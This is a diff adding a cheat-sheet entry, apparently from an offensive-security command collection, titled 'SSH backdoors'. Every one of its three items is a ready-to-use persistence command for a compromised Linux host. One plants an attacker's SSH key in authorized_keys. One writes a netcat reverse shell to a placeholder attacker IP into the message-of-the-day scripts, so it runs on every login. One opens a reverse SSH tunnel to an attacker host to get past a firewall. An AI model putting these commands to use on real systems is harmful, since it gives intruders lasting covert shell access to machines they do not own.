@@ -1,0 +1,40 @@
+title = "SSH backdoors"
+description = ""
+tags = ["linux", "backdoor", "ssh"]
+source = ["https://medium.com/@sec_for_safety/ssh-backdoor-how-to-get-a-proper-shell-on-the-victims-machine-52d28fe6dde1"]
+
+[[data]]
+description = "Add your public SSH key to the compromised user's ~/.ssh/authorized_keys file to mantain access."
+language = "bash"
+command = """#On your machine:
+ssh-keygen -f ./id_rsa 	
+cat id_rsa.pub 		#Copy the public key
+
+#On the compromised machine (substitute <public key>):
+echo '<public key>' >> ~/.ssh/authorized_keys
+
+# set the right permissions
+chmod 700 ~/
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+
+#Connect to the compromised machine with
+ssh compromised-user@machine-ip -i id_rsa"""
+
+[[data]]
+description = "Backdooring SSH message of the day. This will be run whenever someone logs in into the server via SSH (root required):"
+language = "bash"
+command = """echo -e '#!/bin/sh\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER IP> <PORT> >/tmp/f &' > /etc/update-motd.d/20-backdoor && chmod +x /etc/update-motd.d/20-backdoor"""
+
+[[data]]
+description = "Reverse SSH tunnel backdoor (firewall bypass)"
+language = "bash"
+command = """# Run this on the compromised machine:
+ssh -N -R 9999:localhost:22 attacker-user@attackerip
+
+# This will establish an SSH tunnel to the attacker's machine and forward any outgoing traffic from the attacker’s machine on localhost port 9999 back to the victim’s machine on port 22 localhost.
+# Then, on the attacker's machine, run:
+ssh -i ~/.ssh/id_rsa compromised-user@localhost -p 9999
+
+#This will be a persistent backdoor. If you want to clean it, you just need to kill the process running on your own machine on port 9999."""
+
